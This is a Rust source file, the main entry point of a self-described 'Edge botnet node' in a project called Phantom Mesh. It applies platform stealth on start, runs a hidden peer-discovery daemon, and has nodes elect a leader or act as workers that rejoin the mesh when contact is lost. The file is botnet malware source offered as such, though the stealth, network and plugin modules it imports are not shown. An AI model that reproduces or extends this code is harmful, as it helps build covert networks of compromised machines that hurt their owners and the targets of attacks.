//! # Phantom Mesh Edge Node
//!
//! Main entry point for the Edge botnet node.
//! Using smol for lightweight async runtime.

mod core;
mod network;
mod discovery;
mod plugins;
mod stealth;
mod crypto;

use std::sync::Arc;
use log::{info, error};

use core::{run_leader_mode, run_worker_mode};
use discovery::{ElectionService, NodeRole, ZeroNoiseDiscovery};

fn main() {
    env_logger::init();
    info!("edge started");

    // Apply platform-specific stealth
    stealth::check_and_apply_stealth();

    // Run async main loop with smol
    smol::block_on(async_main());
}

async fn async_main() {
    // Discovery Daemon runs in background always
    let disc = Arc::new(ZeroNoiseDiscovery::new());
    let dc = disc.clone();
    smol::spawn(async move {
        dc.run_daemon().await;
    }).detach();

    loop {
        info!("[Main] Entering Election Phase...");
        // Run election to determine role
        let election = Arc::new(ElectionService::new().await);
        let role = election.run_discovery().await;

        // Execute based on role
        match role {
            NodeRole::Leader => {
                info!("[Main] Role: LEADER");
                run_leader_mode(election).await;
                // Leader essentially runs forever unless crashed/killed
            }
            NodeRole::Worker(addr) => {
                info!("[Main] Role: WORKER (Leader: {})", addr);
                run_worker_mode(addr).await;
                // If this returns, connection to Leader failed too many times
                info!("[Main] Worker lost connection to Leader. Restarting Election...");
            }
            _ => {
                error!("Unexpected Role Unbound");
                smol::Timer::after(std::time::Duration::from_secs(5)).await;
            }
        }
    }
}
